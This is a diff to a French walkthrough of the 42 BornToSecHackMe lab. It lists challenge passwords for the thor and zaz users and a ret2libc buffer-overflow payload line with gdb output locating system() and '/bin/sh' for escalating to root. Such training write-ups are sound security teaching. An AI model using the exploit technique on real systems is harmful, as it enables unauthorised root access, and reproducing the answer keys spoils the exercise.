@@ -471,6 +471,78 @@ A partir de la, nous allons creer un script php permettant de gener puis tester 
 	4 2 6 3 1 5
 --------------------------------------------------------------------------------
 
-Nous avons notre password 4 2 6 3 1 5
+Nous avons notre password 4 2 6 3 1 5 pour la phase_6.
+
+
+Nous obtenons Publicspeakingisveryeasy.126241207201b2149op[eu]km[aq]426315
+
+Apres plusieurs essais non concluant, nous apprenons sur le stackoverflow de 42 qu'il faut inverser les lettres len -1 et len -2
+--> https://stackoverflow.com/c/42network/questions/664
+
+
+Nous finissons par obtenir le mot de passe suivant avec la combinaison opekmq de la phase 5.
+
+Publicspeakingisveryeasy.126241207201b2149opekmq426135
+
+Nous pouvons desormais nous connecter en ssh avec thor!
+
+
+
+
+_______________________________________________________________________________
+
+								SSH TO ZAZ
+_______________________________________________________________________________
+
+
+Nous avons un fichier README et un fichier turtle dans le home du user.
+
+thor@BornToSecHackMe:~$ cat README
+Finish this challenge and use the result as password for 'zaz' user.
+
+Pour le fichier turtle une suite d'instructions de deplacement, puis a la fin du fichier :"Can you digest the message";
+Turtle, le nom d'une librairie graphique en python, il va donc falloir parser le fichier et en faire un script comprehensible par cette lib.
+
+Le script est lance avec le binaire et nous obtenons un dessin representant les lettres SLASH
+MD5 : Message Digest 5, en rapport avec la piste donnee a la fin du fichier turtle.
+
+Ce qui nous donne : 646da671ca01bb5d84dbb5fb2238dc8e
+
+
+
+_______________________________________________________________________________
+
+								SSH TO ROOT
+_______________________________________________________________________________
+
+
+
+echo str_repeat(0, 140)"."\x60\xb0\xe6\xb7"."\xe0\xeb\xe5\xb7"."\x58\xcc\xf8\xb7";
+
+
+
+
+
+
+
+
+
+
+
+> (gdb) break main
+> 
+> (gdb) run   
+>
+> (gdb) print &system  
+> $1 = (<text variable, no debug info>*) 0xf7e68250 <system>
+> 
+> (gdb) find &system,+9999999,"/bin/sh"  
+> 0xf7f86c4c
+> warning: Unable to access target memory at 0xf7fd0fd4, halting search. 
+> 1 pattern found.
+
+
+
+
 
 
